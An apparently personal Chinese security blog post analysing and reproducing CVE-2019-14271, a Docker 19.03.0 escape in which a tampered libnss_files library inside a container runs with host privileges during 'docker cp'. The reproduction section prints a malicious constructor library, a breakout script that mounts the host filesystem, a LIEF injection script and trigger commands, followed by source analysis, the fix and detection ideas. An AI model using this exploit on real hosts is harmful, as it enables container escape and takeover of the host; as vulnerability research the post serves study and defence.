<!DOCTYPE html>
<html lang="en">
  <head><meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>


<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />

<meta name="theme-color" content="#f8f5ec" />
<meta name="msapplication-navbutton-color" content="#f8f5ec">
<meta name="apple-mobile-web-app-capable" content="yes">
<meta name="apple-mobile-web-app-status-bar-style" content="#f8f5ec">

<meta name="description" content="CVE-2019-14271 分析复现"/><meta name="keywords" content="CVE复现, click's Blog" /><link rel="alternate" href="/atom.xml" title="click's Blog" type="application/atom+xml"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=2.11.0" />
<link rel="canonical" href="https://click.500team.cn/2022/11/15/CVE-2019-14271/"/>

<link rel="stylesheet" type="text/css" href="/lib/fancybox/jquery.fancybox.css" />
<link rel="stylesheet" type="text/css" href="/css/style.css?v=2.11.0" />

<script id="baidu_push">
(function(){
    var bp = document.createElement('script');
    var curProtocol = window.location.protocol.split(':')[0];
    if (curProtocol === 'https') {
        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
    }
    else {
        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
    }
    var s = document.getElementsByTagName("script")[0];
    s.parentNode.insertBefore(bp, s);
})();
</script>
<script>
  window.config = {"leancloud":{"app_id":null,"app_key":null},"toc":true,"fancybox":true,"pjax":"","latex":false};
</script>

<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/disqusjs@1.3/dist/disqusjs.css">


    <title>CVE-2019-14271 分析复现 - click's Blog</title>
  <meta name="generator" content="Hexo 5.4.0"></head>

  <body><div id="mobile-navbar" class="mobile-navbar">
  <div class="mobile-header-logo">
    <a href="/." class="logo">click's Blog</a>
  </div>
  <div class="mobile-navbar-icon">
    <span></span>
    <span></span>
    <span></span>
  </div>
</div>

<nav id="mobile-menu" class="mobile-menu slideout-menu">
  <ul class="mobile-menu-list"><a href="/">
        <li class="mobile-menu-item">Home
          </li>
      </a><a href="/tags/">
        <li class="mobile-menu-item">Tags
          </li>
      </a><a href="/about/">
        <li class="mobile-menu-item">About
          </li>
      </a></ul>
</nav>
<div class="container" id="mobile-panel">
      <header id="header" class="header"><div class="logo-wrapper">
  <a href="/." class="logo">click's Blog</a>
</div>

<nav class="site-navbar"><ul id="menu" class="menu"><li class="menu-item">
          <a class="menu-item-link" href="/">
            Home
            </a>
        </li>
      <li class="menu-item">
          <a class="menu-item-link" href="/tags/">
            Tags
            </a>
        </li>
      <li class="menu-item">
          <a class="menu-item-link" href="/about/">
            About
            </a>
        </li>
      </ul></nav>
</header>

      <main id="main" class="main">
        <div class="content-wrapper">
          <div id="content" class="content"><article class="post">
    <header class="post-header">
      <h1 class="post-title">CVE-2019-14271 分析复现
        </h1>

      <div class="post-meta">
        <span class="post-time">
          2022-11-15
        </span><span class="post-author">
          / click
        </span>
        </div>
    </header>

    <div class="post-toc" id="post-toc">
    <h2 class="post-toc-title">Contents</h2>
    <div class="post-toc-content">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86"><span class="toc-text">基础知识</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#docker-cp-%E6%B5%81%E7%A8%8B"><span class="toc-text">docker cp 流程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Cgo"><span class="toc-text">Cgo</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Go-%E5%AF%BC%E5%85%A5%E5%8C%85%E7%9A%84%E6%9F%A5%E6%89%BE%E9%A1%BA%E5%BA%8F"><span class="toc-text">Go 导入包的查找顺序</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E8%AF%A6%E6%83%85"><span class="toc-text">漏洞详情</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AE%80%E4%BB%8B"><span class="toc-text">简介</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BD%B1%E5%93%8D"><span class="toc-text">影响</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="toc-text">漏洞复现</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%8D%E7%8E%B0%E7%8E%AF%E5%A2%83"><span class="toc-text">复现环境</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B"><span class="toc-text">复现过程</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-text">漏洞分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#docker-cp-%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90"><span class="toc-text">docker cp 流程分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#docker-tar-%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90"><span class="toc-text">docker-tar 流程分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%9D%99%E6%80%81%E7%BC%96%E8%AF%91%E7%89%88%E6%9C%AC%E6%98%AF%E5%90%A6%E5%8F%97%E5%BD%B1%E5%93%8D"><span class="toc-text">静态编译版本是否受影响</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D%E5%88%86%E6%9E%90"><span class="toc-text">漏洞修复分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BC%93%E8%A7%A3%E6%96%B9%E6%A1%88"><span class="toc-text">缓解方案</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%A1%88"><span class="toc-text">修复方案</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%9D%E8%80%83"><span class="toc-text">思考</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%97%AE%E9%A2%98"><span class="toc-text">问题</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="toc-text">参考链接</span></a></li></ol>
    </div>
  </div><div class="post-content"><h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><h3 id="docker-cp-流程"><a href="#docker-cp-流程" class="headerlink" title="docker cp 流程"></a>docker cp 流程</h3><p><a href="/2022/11/04/CVE-2018-15664#docker-cp-%E5%AE%9E%E7%8E%B0%E6%B5%81%E7%A8%8B">docker cp 源码分析</a></p>
<p><strong>新版本变化</strong>: 在 docker 19.03 中，为了解决 CVE-2018-15664 的问题，在从容器向宿主机复制文件，调用 <code>archive.TarWithOptions()</code> 前，使用 <code>realchroot()</code> 将 cwd 和 root 设置到 <code>container.BaseFS.Path()</code>（_attacker 不可控_），来避免容器中文件路径中存在符号链接解析，导致路径穿越的问题。<br>因此在 docker cp 从容器中向宿主机复制文件时，在调用 <code>archive.TarWithOptions()</code>（归根到底是调用到 <code>user.lookupUnixUid()</code> =&gt; <code>C.mygetpwuid_r()</code>，该函数是 nsswitch 动态库中 <code>getpwuid_r()</code> 函数的封装 ） 前，都 chroot 到了容器根目录中。</p>
<h3 id="Cgo"><a href="#Cgo" class="headerlink" title="Cgo"></a>Cgo</h3><p><a target="_blank" rel="noopener" href="https://chai2010.cn/advanced-go-programming-book/ch2-cgo/ch2-01-hello-cgo.html">https://chai2010.cn/advanced-go-programming-book/ch2-cgo/ch2-01-hello-cgo.html</a><br><a target="_blank" rel="noopener" href="https://go.dev/blog/cgo">https://go.dev/blog/cgo</a><br><a target="_blank" rel="noopener" href="https://chai2010.cn/advanced-go-programming-book/ch2-cgo/ch2-09-static-shared-lib.html">Cgo 静态库和动态库</a><br>Cgo 实现了在 Go 中直接调用内嵌 c 代码的功能，Cgo 使用 gcc 来编译和链接 C 和 Go 桥接的代码。<br>包含了 Cgo 内容的 go 程序，如果在编译时没有指定静态编译方式（_1. 通过 CGO_ENABLED=0 2. 通过指定外部链接器和 static 标志_），则编译出的文件会是一个动态链接的二进制文件，执行到动态库中的函数时，会加载对应的依赖库。<br><a target="_blank" rel="noopener" href="https://juejin.cn/post/6844903619527983111">CGO_ENABLED 环境变量对 Go 静态编译机制的影响</a></p>
<h3 id="Go-导入包的查找顺序"><a href="#Go-导入包的查找顺序" class="headerlink" title="Go 导入包的查找顺序"></a>Go 导入包的查找顺序</h3><p>不使用 <code>go mod</code> 管理（<code>GO111MODULE=&quot;off&quot;</code>）：</p>
<ul>
<li><code>vendor</code> 目录下的包</li>
<li><code>$GOPATH/src</code> 下的包</li>
<li>$<code>GOROOT/src</code> 下的包（内置包的位置）</li>
</ul>
<p>注意这时要么都使用 <code>vendor</code> 下的包，要么都使用 <code>$GOPATH</code> 下的包，不会混用</p>
<p>使用 <code>go mod</code> 管理（GO111MODULE=”on”）</p>
<ul>
<li>优先使用 <code>vendor</code> 目录下的包</li>
<li><code>$GOPATH/pkg/mod/</code> 下的包</li>
<li><code>$GOROOT/src 下的包</code>（内置包）</li>
</ul>
<p><code>vendor</code> 和 <code>pkg/mod</code> 下的包也不会混用</p>
<h2 id="漏洞详情"><a href="#漏洞详情" class="headerlink" title="漏洞详情"></a>漏洞详情</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>由于 docker cp 过程中，为了防止 CVE-2018-15664 这类路径穿越问题，在调用 docker-tar 和 docker-untar 中，进程根目录被 chroot 到了容器根目录中。在切换根目录操作之后，存在调用动态库中函数（<code>getpwuid_r()</code>）。<br>要注意此进程的相关上下文（ns 之类，除了进程的 root 目录）都属于宿主机（是一个高权限进程），而所执行的动态库函数是容器可控的。攻击者可以通过定制一个恶意动态库文件，在宿主机执行 docker cp 时，恶意动态库中的代码将会被宿主机执行，从而实现逃逸，也就是常见的 so 库劫持。</p>
<h3 id="影响"><a href="#影响" class="headerlink" title="影响"></a>影响</h3><p>静态编译版本不受影响<br>非静态编译的 19.03.0 &lt;= docker &lt; 19.03.1 受影响</p>
<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="复现环境"><a href="#复现环境" class="headerlink" title="复现环境"></a>复现环境</h3><ul>
<li>docker 19.03.0</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">root@click:~<span class="comment"># docker version</span></span><br><span class="line"><span class="comment"># client 版本不限</span></span><br><span class="line">Client: Docker Engine - Community</span><br><span class="line"> Version:           20.10.21</span><br><span class="line"> API version:       1.40</span><br><span class="line"> Go version:        go1.18.7</span><br><span class="line"> Git commit:        baeda1f</span><br><span class="line"> Built:             Tue Oct 25 18:02:00 2022</span><br><span class="line"> OS/Arch:           linux/amd64</span><br><span class="line"> Context:           default</span><br><span class="line"> Experimental:      <span class="literal">true</span></span><br><span class="line"></span><br><span class="line">Server: Docker Engine - Community</span><br><span class="line"> Engine:</span><br><span class="line">  Version:          19.03.0</span><br><span class="line">  API version:      1.40 (minimum version 1.12)</span><br><span class="line">  Go version:       go1.12.5</span><br><span class="line">  Git commit:       aeac949</span><br><span class="line">  Built:            Wed Jul 17 18:13:43 2019</span><br><span class="line">  OS/Arch:          linux/amd64</span><br><span class="line">  Experimental:     <span class="literal">false</span></span><br><span class="line"> containerd:</span><br><span class="line">  Version:          1.6.12</span><br><span class="line">  GitCommit:        a05d175400b1145e5e6a735a6710579d181e7fb0</span><br><span class="line"> runc:</span><br><span class="line">  Version:          1.1.4</span><br><span class="line">  GitCommit:        v1.1.4-0-g5fd4c4d</span><br><span class="line"> docker-init:</span><br><span class="line">  Version:          0.18.0</span><br><span class="line">  GitCommit:        fec3683</span><br></pre></td></tr></table></figure>

<ul>
<li>lief<br><a target="_blank" rel="noopener" href="https://github.com/lief-project/LIEF">https://github.com/lief-project/LIEF</a><br>用来注入 so 库文件</li>
</ul>
<h3 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h3><ol>
<li>编译一个恶意代码库文件（library），用来注入到会被调用到的 libnss_files-xx.so 文件中</li>
</ol>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdbool.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ORIGINAL_LIBNSS <span class="meta-string">&quot;/lib/x86_64-linux-gnu/libnss_files-2.27-origin.so&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LIBNSS_PATH <span class="meta-string">&quot;/lib/x86_64-linux-gnu/libnss_files.so.2&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">is_priviliged</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">__attribute__ ((constructor)) <span class="function"><span class="keyword">void</span> <span class="title">back</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *argv_break[<span class="number">2</span>];</span><br><span class="line">    <span class="comment">// 检查是否为宿主机进程</span></span><br><span class="line">    <span class="keyword">if</span> (!is_priviliged())</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    <span class="comment">// 将原始 libnss_files 文件替换回来，在实验中，如果不替换回来会导致无限调用此恶意函数，因为 retry 调用</span></span><br><span class="line">    rename(ORIGINAL_LIBNSS, LIBNSS_PATH);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 在子进程中执行恶意代码部分放到 breakout 脚本中，可以方便定义执行命令内容</span></span><br><span class="line">    <span class="keyword">if</span> (!fork()) &#123;</span><br><span class="line">        <span class="comment">// child process</span></span><br><span class="line">        argv_break[<span class="number">0</span>] = strdup(<span class="string">&quot;/breakout&quot;</span>);</span><br><span class="line">        argv_break[<span class="number">1</span>] = <span class="literal">NULL</span>;</span><br><span class="line">        execve(<span class="string">&quot;/breakout&quot;</span>, argv_break, <span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        wait(<span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 通过检查容器中 /proc/self/exe 是否存在来判断是否为宿主机进程（特权进程）</span></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">is_priviliged</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    FILE *proc_file_in_cnt = fopen(<span class="string">&quot;/proc/self/exe&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="comment">// process in conainer</span></span><br><span class="line">    <span class="keyword">if</span> (proc_file_in_cnt != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        fclose(proc_file_in_cnt);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// process in host</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -shared -fPIC /tmp/evil.c -o /tmp/evil.out</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>编写所要执行的恶意代码脚本 breakout，这里的逃逸效果选择将宿主机文件系统挂载到容器中</li>
</ol>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line">umount /host_proc; rm -rf /host_proc</span><br><span class="line">umount /host_fs; rm -rf /host_fs</span><br><span class="line"></span><br><span class="line">mkdir /host_proc</span><br><span class="line">mount -t proc none /host_proc</span><br><span class="line">cd /host_proc/<span class="number">1</span>/root</span><br><span class="line"></span><br><span class="line">mkdir /host_fs</span><br><span class="line">mount --bind</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>将恶意库文件注入到 libnss_files-xx.so 中</li>
</ol>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> lief</span><br><span class="line"></span><br><span class="line">lib_file = lief.parse(<span class="string">&quot;&quot;</span>)</span><br><span class="line">lib_file.add_library(<span class="string">&quot;/tmp/evil.out&quot;</span>)</span><br><span class="line">lib_file.write(<span class="string">&quot;/tmp/libnss_files.so.2&quot;</span>)</span><br></pre></td></tr></table></figure>

<ol start="4">
<li>将注入好的恶意库文件，所调用的 evil.out 库文件，breakout 逃逸脚本保存在容器中（当然也可以直接在容器中进行 1/2 两步）</li>
</ol>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker cp /tmp/evil.out [cnt-id]:/tmp/</span><br><span class="line">docker cp /tmp/libnss_files.so.2 [cnt-id]:/lib/x86_64-linux-gnu/</span><br><span class="line">docker cp /tmp/breakout [cnt-id]:/tmp/</span><br></pre></td></tr></table></figure>

<ol start="5">
<li>执行 docker cp，从容器中复制文件到宿主机上，触发 docker-tar 执行，从而出发恶意代码被宿主机上下文进程执行。</li>
</ol>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker cp [cnt-id]:/etc/passwd /tmp/</span><br></pre></td></tr></table></figure>

<ol start="6">
<li>验证恶意代码执行成功，宿主机 proc 文件系统被挂载到 /host_proc 上，宿主机根文件系统被挂载到容器中的 /host_fs 上。</li>
</ol>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># in container</span></span><br><span class="line">ls /host_proc</span><br><span class="line">...</span><br><span class="line">ls /host_fs</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h3 id="docker-cp-流程分析"><a href="#docker-cp-流程分析" class="headerlink" title="docker cp 流程分析"></a>docker cp 流程分析</h3><p>见 <a href="/2022/11/04/CVE-2018-15664#docker-cp-%E5%AE%9E%E7%8E%B0%E6%B5%81%E7%A8%8B">CVE-2018-15664</a>，其中部分细节有所不同，可以对比 docker 19.03.0 源码看。</p>
<h3 id="docker-tar-流程分析"><a href="#docker-tar-流程分析" class="headerlink" title="docker-tar 流程分析"></a>docker-tar 流程分析</h3><p>根据 docker cp 的流程来看，可以看到在从容器向宿主机复制文件时，会通过 reexec 机制调用 docker-tar 命令。<br><img src="https://b3logfile.com/file/2023/03/solo-fetchupload-16837957405232876497-hr2Cyi7.png" alt="image.png"><br><img src="https://b3logfile.com/file/2023/03/solo-fetchupload-3075220474110111395-UlQymjX.png" alt="image.png"><br><img src="https://b3logfile.com/file/2023/03/solo-fetchupload-8868303483394173714-DdHcm4N.png" alt="image.png"><br>传入的第 2 个参数 <code>relSrc</code> 为容器中源文件的路径（相对于容器文件系统），第 3 个参数 <code>root</code> 为指定容器的根目录在宿主机上的路径。<br><img src="https://b3logfile.com/file/2023/03/solo-fetchupload-14928263318781436464-ugmzDo8.png" alt="image.png"><br>跟进 <code>docker-tar</code> 注册的回调函数 <code>tar()</code> 中：<br><img src="https://b3logfile.com/file/2023/03/solo-fetchupload-3069689227827309241-HdZurQt.png" alt="image.png"><br>可以看到 docker-tar 执行时，<strong>先通过 <code>realChroot()</code>（chroot 的包装）将进程根目录切换到容器目录下，随后调用 <code>archive.TarWithOptions()</code> 来打包容器中的源文件</strong>。<br><code>archive.TarWithOptions()</code> =&gt; <code>addTarFile()</code> =&gt; <code>FileInfoHeader()</code> =&gt; <code>tar.FileInfoHeader()</code> （在 docker 19.03 中这里的 tar 包是 go sdk 中的 archive/tar 内置包，而不是之前优先加载的 vendor 目录下的 archive/tar），其中的 <code>sysStat</code> 在 stat_unix.go 中注册：<br><img src="https://b3logfile.com/file/2023/03/solo-fetchupload-1451826403087574554-Z4efoGj.png" alt="image.png"><br>sysStat 中调用了 user.LookupId() 及 user.LookupGroupId()，（os/user 库中的函数，就要注意是否调用了 cgo 内容）。<br><img src="https://b3logfile.com/file/2023/03/solo-fetchupload-13969212723544706736-bRPcZoE.png" alt="image.png"><br>这两个函数的实现中包含了 cgo 部分(os/user/cgo_lookup_unix.go 中)，并函数实现在动态链接库 libnss_files.so 中：<br><img src="https://b3logfile.com/file/2023/03/solo-fetchupload-3453910324709686291-K8GxuuG.png" alt="image.png"><br><img src="https://b3logfile.com/file/2023/03/solo-fetchupload-5468141264181273142-u6mdr9W.png" alt="image.png"><br><img src="https://b3logfile.com/file/2023/03/solo-fetchupload-5130992679577141526-1trVZcu.png" alt="image.png"><br><img src="https://b3logfile.com/file/2023/03/solo-fetchupload-12848425403469542140-OebrWse.png" alt="image.png"><br><img src="https://b3logfile.com/file/2023/03/solo-fetchupload-10132695049033324924-nHrUZqO.png" alt="image.png"><br>在 cgo_lookup_unix.go 的 build tags 中可以看到<br><img src="https://b3logfile.com/file/2023/03/solo-fetchupload-4322996742072433178-RR5cR7l.png" alt="image.png"><br>所以如果 dockerd 是动态编译版本，并且开启了 cgo，没有使用 osusergo tag，则运行到这里的时候会加载 /lib/x86_64-linux-gnu/libnss_files.so 来执行其中定义的 getpwuid_r/getgrgid_r 函数。<strong>注意：此时进程的根目录已经切换到了容器中，所以加载的链接库也相应的是容器中的 so 文件！而这个 docker-tar 进程是一个高权限进程（宿主机 ns/cgroup，宿主机 cap），所以通过修改 so 库内容，会导致高权限进程的任意代码执行。</strong></p>
<h3 id="静态编译版本是否受影响"><a href="#静态编译版本是否受影响" class="headerlink" title="静态编译版本是否受影响"></a>静态编译版本是否受影响</h3><p>静态编译版本中，使用了 osusergo build tag 保证了 os/user 包不会使用 cgo 内容，也就不会调用 so 库中的内容，所以不会受到影响：<br><img src="https://b3logfile.com/file/2023/03/solo-fetchupload-13430627284011737437-XUx0akr.png" alt="image.png"></p>
<h2 id="漏洞修复分析"><a href="#漏洞修复分析" class="headerlink" title="漏洞修复分析"></a>漏洞修复分析</h2><h3 id="缓解方案"><a href="#缓解方案" class="headerlink" title="缓解方案"></a>缓解方案</h3><p>在 docker 19.03.1 中，在执行 chroot 之前，通过调用链接库相关函数，提前加载了涉及到的 so 库文件。避免在 chroot 到容器环境中后从容器文件系统中获取 so 库文件。<br><img src="https://b3logfile.com/file/2023/03/solo-fetchupload-8830897008245628698-VEIFrOq.png" alt="image.png"><br>但是如果宿主机上加载 libnss_files.so 失败，那么还是会在 chroot 到容器中尝试加载容器中的 so 文件。</p>
<h3 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h3><p>在 docker 18.09.8 之前，vendor 目录下包含 archive/tar 包，因此在上述 docker-tar 流程中会调用 vendor/archive/tar 包中的 <code>sysUnix()</code> 函数，而这个版本的 <code>sysUnix()</code> 函数不包含 cgo 内容，因此是不会掉用 so 库内容的，没有风险。<br><img src="https://b3logfile.com/file/2023/03/solo-fetchupload-1523586788801039097-D2KzSt9.png" alt="image.png"><br>为了避免 19.03.0 动态链接版本中调用 go 内置 archive/tar 包中包含调用动态链接函数的 <code>statUnix()</code> 方法，在之后的版本中，将旧版本中 vendor 下的不包含 cgo 内容的 archive/tar 包还原了回来，这样优先加载 vendor 中的 <code>statUnix()</code> 方法，不会去调用动态链接函数。</p>
<h2 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h2><ul>
<li>漏洞成因核心<br>高权限进程的执行内容被容器中内容污染，造成宿主机任意代码执行。</li>
<li>漏洞行为特征<br>以下两条可以以此作为运行时监控的事中告警依据：<br>(1) docker 进程/容器外进程（高权限进程），在执行过程中调用了容器文件系统中的链接库文件/或其他文件<br>(2) 在攻击成功后，会打开宿主机文件系统中的文件（排除掉挂载到容器中的 volume）</li>
<li>针对 docker 源码的审计<br>检查 docker 依赖的 cgo 动态库文件，寻找调用库函数的时的上下文情况是否会暴露给容器</li>
</ul>
<h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><p>bind mount 可以跨越 mnt namespace 吗？不可以</p>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul>
<li><a target="_blank" rel="noopener" href="https://unit42.paloaltonetworks.com/docker-patched-the-most-severe-copy-vulnerability-to-date-with-cve-2019-14271/">https://unit42.paloaltonetworks.com/docker-patched-the-most-severe-copy-vulnerability-to-date-with-cve-2019-14271/</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/moby/moby/issues/39449">https://github.com/moby/moby/issues/39449</a></li>
<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/s2603898260/article/details/105632270">https://blog.csdn.net/s2603898260/article/details/105632270</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/moby/moby/pull/39612/files">https://github.com/moby/moby/pull/39612/files</a></li>
</ul>

      </div>
      <div class="post-copyright">
    <p class="copyright-item">
      <span>Author: </span>
      <a href="https://click.500team.cn">click</a>
    </p>
    <p class="copyright-item">
      <span>Link: </span>
      <a href="https://click.500team.cn/2022/11/15/CVE-2019-14271/">https://click.500team.cn/2022/11/15/CVE-2019-14271/</a>
    </p>
    <p class="copyright-item">
      <span>License: </span><a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/" target="_blank">知识共享署名-非商业性使用 4.0 国际许可协议</a>
    </p>
  </div>
      <footer class="post-footer">
        <div class="post-tags">
            <a href="/tags/CVE%E5%A4%8D%E7%8E%B0/">CVE复现</a>
            </div>
        
        <nav class="post-nav"><a class="prev" href="/2022/11/30/cdk-evaluate/">
        <i class="iconfont icon-left"></i>
        <span class="prev-text nav-default">CDK 源码阅读笔记（evaluate 部分）</span>
        <span class="prev-text nav-mobile">Prev</span>
      </a>
    <a class="next" href="/2022/11/04/CVE-2018-15664/">
        <span class="next-text nav-default">CVE-2018-15664 分析复现</span>
        <span class="prev-text nav-mobile">Next</span>
        <i class="iconfont icon-right"></i>
      </a>
    </nav></footer>
    </article></div><div class="comments" id="comments"></div></div>
      </main>

      <footer id="footer" class="footer"><div class="social-links"><a href="mailto:c1ick9917@gmail.com" class="iconfont icon-email" title="email"></a>
        <a href="/atom.xml" class="iconfont icon-rss" title="rss"></a>
    </div><div class="copyright">
  <span class="power-by">
    Powered by <a class="hexo-link" target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>
  </span>
  <span class="division">|</span>
  <span class="theme-info">
    Theme - 
    <a class="theme-link" target="_blank" rel="noopener" href="https://github.com/ahonn/hexo-theme-even">Even</a>
  </span>

